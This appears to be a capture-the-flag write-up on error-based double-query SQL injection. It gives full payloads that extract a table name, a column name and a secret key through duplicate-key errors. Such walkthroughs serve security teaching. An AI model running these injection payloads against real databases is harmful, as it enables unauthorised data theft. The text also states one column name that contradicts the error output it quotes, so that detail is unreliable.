# Challenge - 6

This challenge is based on double query injection and we have to use AND in this injection

## Initial Analysis

First we have to find out how the developer has given the query so we try giving id the value. We can break query using '`\`' Which will give an error

```ABAP
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\ LIMIT 0,1' at line 1
```

From this we can assume that the query is like:

```sql
select login_name,password from table_name where id = input 
```

We can check this using id=

```sql
0 or 1=1 --+
```

which will give us a login id and password.

This challenge is similar to the previous one so we can use the same payload

### Solving

We can get the table name using: id=

```sql
1 AND (select 1 from(select count(*),concat(0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,floor(rand()*2))a from information_schema.tables group by a)b); --+
```

It will give the error:

```ABAP
Duplicate entry ':brswxk4bx6:0' for key 'group_key'
```

From which we get table_name = **brswxk4bx6**

Now we can get the column name using: id=

```sql
1 AND (select 1 from(select count(*),concat(0x3a,(select column_name from information_schema.columns where table_name='brswxk4bx6' limit 2,1),0x3a,floor(rand()*2))a from information_schema.tables group by a)b); --+
```

Which will give the error:

```ABAP
Duplicate entry ':secret_MH2B:0' for key 'group_key'
```

From which we will get column_name = **secret_5SO5**

Now we can get the secret key using : id=

```sql
1 AND (select 1 from(select count(*),concat(0x3a,(select secret_MH2B from brswxk4bx6),0x3a,floor(rand()*2))a from information_schema.tables group by a)b); --+
```

Which will give the error:

```ABAP
Duplicate entry ':MWEO9IB251RirQPBewbIgCfd:0' for key 'group_key'
```

where the key is :
**MWEO9IB251RirQPBewbIgCfd**
